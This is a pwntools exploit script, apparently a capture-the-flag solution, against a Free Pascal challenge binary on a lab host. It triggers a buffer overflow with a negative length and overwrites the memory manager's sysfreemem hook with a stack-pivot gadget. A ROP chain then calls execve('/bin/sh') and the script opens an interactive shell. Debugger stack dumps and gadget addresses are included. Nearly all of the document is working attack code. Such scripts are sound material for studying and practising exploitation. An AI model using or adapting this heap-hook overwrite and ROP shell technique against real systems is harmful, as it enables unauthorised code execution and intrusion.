from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']

binary = './solution/chall/app'
nc = 'nc 10.20.10.10 9205'
elf = context.binary = ELF(binary)
libc = elf.libc
gdbscript = """
	b * main
	c
"""

if len(sys.argv) == 1: p = process(binary)
elif sys.argv[1] == 'd': p = gdb.debug(binary, gdbscript)
elif sys.argv[1] == 'r': p = remote(nc.split(' ')[1], int(nc.split(' ')[2]))
else: p = process(binary); util.proc.wait_for_debugger(util.proc.pidof(p)[0])

def myappend(length, data):
	p.recvuntil(b'> ')
	p.sendline(b'1')
	p.recvuntil(b'length: ')
	p.sendline(length)
	p.recvuntil(b'data: ')
	p.sendline(data)


# pxr @ obj.unit_tc.system_memorymanager__
# sysreallocmem hook is at: 0x429028, with value: 0x419bc0
# choice (2 bytes) is written to: [parentfp - 4]
memory_manager = elf.symbols['TC_$SYSTEM_$$_MEMORYMANAGER']
sysgetmem_hook = memory_manager + 0x8
sysfreemem_hook = memory_manager + 0x10
sysfreememsize_hook = memory_manager + 0x18
sysallocmem_hook = memory_manager + 0x20
sysreallocmem_hook = memory_manager + 0x28

sysreallocmem = elf.symbols['SYSTEM_$$_SYSREALLOCMEM$POINTER$QWORD$$POINTER']

print(f'sysreallocmem hook: {hex(sysreallocmem_hook)}')

# sysgetmem does not work since no moves stack to my buffer

# overwrite sysfreemem hook
payload = b'AAAAAAAA' * 16
payload += p64(0) # set to null (for concat to think there is no string yet) i think...
payload += b'B' * 8
payload += p64(sysfreemem_hook + 4)
myappend(b'-1', payload)

# d8 gadget
# 0x0000000000412e88 : lea rsp, [rsp + 0xd8] ; ret

p.recvuntil(b'> ')
p.sendline(b'11912') # d8 gadget
p.recvuntil(b'length: ')
p.sendline(b'-1')

'''
stack when ret from d8 gadget is about to happen (freemem happens in iocheck -> ... fpc_jump ... fpc_ansistr_decr_ref)
0x7ffffbbaf250  0x4548454845484548  0x4141414141414141   HEHEHEHEAAAAAAAA
0x7ffffbbaf260  0x4141414141414141  0x4141414141414141   AAAAAAAAAAAAAAAA
0x7ffffbbaf270  0x4141414141414141  0x4141414141414141   AAAAAAAAAAAAAAAA

0x7ffffbbaf280  0x4141414141414141  0x4141414141414141   AAAAAAAAAAAAAAAA
0x7ffffbbaf290  0x4141414141414141  0x0000000000000000   AAAAAAAA........
0x7ffffbbaf2a0  0x42424242424200ff  0x0000000000429034   ..BBBBBB4.B.....
0x7ffffbbaf2b0  0x4343434343434343  0x4343434343434343   CCCCCCCCCCCCCCCC
0x7ffffbbaf2c0  0x4343434343434343  0x4343434343434343   CCCCCCCCCCCCCCCC
0x7ffffbbaf2d0  0x4343434343434343  0x4343434343434343   CCCCCCCCCCCCCCCC
0x7ffffbbaf2e0  0x4343434343434343  0x4343434343434343   CCCCCCCCCCCCCCCC
0x7ffffbbaf2f0  0x4343434343434343  0x4343434343434343   CCCCCCCCCCCCCCCC
0x7ffffbbaf300  0x4343434343434343  0x4343434343434343   CCCCCCCCCCCCCCCC
0x7ffffbbaf310  0x0043434343434343  0x00007ffffbbb02b6   CCCCCCC.........
'''

# i guess pascal also has "/bin/sh" string
binsh = 0x426551

# 0x0000000000403655 : pop rdi ; pop r14 ; pop r13 ; pop r12 ; pop rbx ; ret
# 0x000000000040256c : pop rsi ; pop r13 ; pop r12 ; pop rbx ; ret
# 0x0000000000405f46 : and rdx, rcx ; mov rax, rdx ; ret
# 0x00000000004133e3 : pop rax ; ret
# 0x0000000000401085 : syscall

rdi = 0x403655
rsi = 0x40256c
rdx = 0x405f46
rax = 0x4133e3
syscall = 0x401085

rop_chain = p64(rdi)
rop_chain += p64(binsh)
rop_chain += p64(0)
rop_chain += p64(0)
rop_chain += p64(0)
rop_chain += p64(0)
rop_chain += p64(rdx)
rop_chain += p64(rsi)
rop_chain += p64(0)
rop_chain += p64(0)
rop_chain += p64(0)
rop_chain += p64(sysfreemem_hook + 4)
rop_chain += p64(rax)
rop_chain += p64(59)
rop_chain += p64(syscall)

payload = b'HHHHHHHH' * 7 + rop_chain
p.recvuntil(b'data: ')
p.sendline(payload)

p.recvuntil(b'> ')
p.sendline(b'11912') # d8 gadget
p.recvuntil(b'length: ')
p.sendline(b'a') # fail iocheck, calls freemem at some point

p.interactive()

'''
freemem overwrite stack when entered gadget

0x7fff697a61b8  0x00000000004187db  0x0000000000000001   ..A.............
0x7fff697a61c8  0x000000000040b141  0x00000000004337b8   A.@......7C.....
0x7fff697a61d8  0x0000000000401331  0x00000000004337b8   1.@......7C.....
0x7fff697a61e8  0x0000000000000000  0x0000000000000000   ................
0x7fff697a61f8  0x0000000000000001  0x00000000004337b8   .........7C.....
0x7fff697a6208  0x00007fff697a62f0  0x0000000000000000   .bzi............
0x7fff697a6218  0x0000000000000000  0x0000000000000000   ................
0x7fff697a6228  0x0000000000000000  0x00007fff697a61e0   .........azi....
0x7fff697a6238  0x00000000004010fa  0x00007fff697a6200   ..@......bzi....
0x7fff697a6248  0x0000000000000000  0x0000000000000001   ................
0x7fff697a6258  0x4141414141414141  0x4141414141414141   AAAAAAAAAAAAAAAA
0x7fff697a6268  0x4141414141414141  0x4141414141414141   AAAAAAAAAAAAAAAA
0x7fff697a6278  0x4141414141414141  0x4141414141414141   AAAAAAAAAAAAAAAA
0x7fff697a6288  0x4141414141414141  0x4141414141414141   AAAAAAAAAAAAAAAA
0x7fff697a6298  0x4141414141414141  0x4141414141414141   AAAAAAAAAAAAAAAA
0x7fff697a62a8  0x4141414141414141  0x4141414141414141   AAAAAAAAAAAAAAAA
0x7fff697a62b8  0x4141414141414141  0x4141414141414141   AAAAAAAAAAAAAAAA

'''
